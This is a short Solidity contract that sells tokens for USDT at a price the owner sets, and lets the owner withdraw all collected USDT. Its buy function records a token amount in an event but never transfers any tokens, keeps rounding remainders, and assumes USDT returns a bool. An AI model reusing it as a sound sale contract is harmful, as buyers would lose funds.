// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TokenPurchase {
    address public owner;
    IERC20 public usdt;
    uint256 public tokenPrice = 1 * 10 ** 6; // 1 USDT (6 decimals)

    event Purchase(
        address indexed buyer,
        uint256 usdtAmount,
        uint256 tokenAmount
    );

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor(address _usdt) {
        owner = msg.sender;
        usdt = IERC20(_usdt);
    }

    function setTokenPrice(uint256 newPrice) external onlyOwner {
        tokenPrice = newPrice;
    }

    function buyTokens(uint256 usdtAmount) external {
        require(usdtAmount >= tokenPrice, "Too little sent");

        uint256 tokenAmount = usdtAmount / tokenPrice;

        bool success = usdt.transferFrom(msg.sender, address(this), usdtAmount);
        require(success, "USDT transfer failed");

        emit Purchase(msg.sender, usdtAmount, tokenAmount);
    }

    function withdrawUSDT() external onlyOwner {
        uint256 balance = usdt.balanceOf(address(this));
        require(usdt.transfer(owner, balance), "Withdraw failed");
    }
}